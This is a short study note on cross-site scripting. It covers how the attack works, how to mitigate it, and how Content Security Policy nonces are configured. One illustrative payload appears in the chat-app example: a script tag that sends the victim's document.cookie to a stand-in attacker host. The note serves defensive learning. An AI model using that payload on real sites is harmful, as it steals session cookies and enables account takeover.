---
tags: [Security]
title: 'Security: Cross-site scripting (XSS)'
created: '2024-03-28T07:19:52.108Z'
modified: '2024-03-28T09:46:23.803Z'
---

# Security: Cross-site scripting (XSS)

[SNYK lesson](https://learn.snyk.io/lesson/xss/)

XSS is injection and subsequent execution of the malicious code to, and by, a trusted website.

Sequence of actions:
1. The attacker injects a malicious script into a trusted website
2. The user interacts with the compromised website
3. During that interaction, the user's browser executes the malicious script

A common source of XSS threat &mdash; if a website can render **unescaped HTML** that can be somehow slipped in by the attacker, e.g. via user input.

**Example**: a chat app that, when rendering messages, does not escape the content sent by the sender:
1. the attacker sends a message containing malicious code, e.g. `<script>new Image().src="http://maliciouswebsite.io/"+document.cookie;</script>`
2. the other chat member receives the attacker's message
3. the receiver's browser executes malicious code contained in the attacker's message

**NB!** Malicious code can be wrapped not only in `<script>`s &mdash; other examples are `<img src>`, `<img onerror>`, `<a href>`, etc.

**Threat mitigation**
- Identify all places where external users can provide their input
- Validate all user inputs
- Escape the output from user-controlled data
- Avoid placing user inputs in `<script>`, `<style>`, HTML attributes
- Set up **Content Security Policy**
- Enforce [**Trusted Types**](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)


## Content Security Policy

[Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)  
[Content-Security-Policy header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)

To start off, the browser must be communicated the CSP policy somehow. This can be done in one of 2 ways:
- server sets `Content-Security-Policy: ...` header on the response with page HTML
- on the page itself, using `<meta http-equiv="Content-Security-Policy" content="...">` in the `<head>`

**Best practice**: **`'nonce-*'`** directive values are often used with `script-src` and `style-src` to be able to _whitelist_ trusted inline scripts/styles as follows:
- random nonce is generated by the server
- CSP header includes `script-src 'nonce-{randomNonceValue}'`
- the whitelisted inline script on the page must have `nonce` attribute like so: `<script nonce="{randomNonceValue}">...</script>`
- all inline scripts without, or with differing, nonce will be blocked by the browser
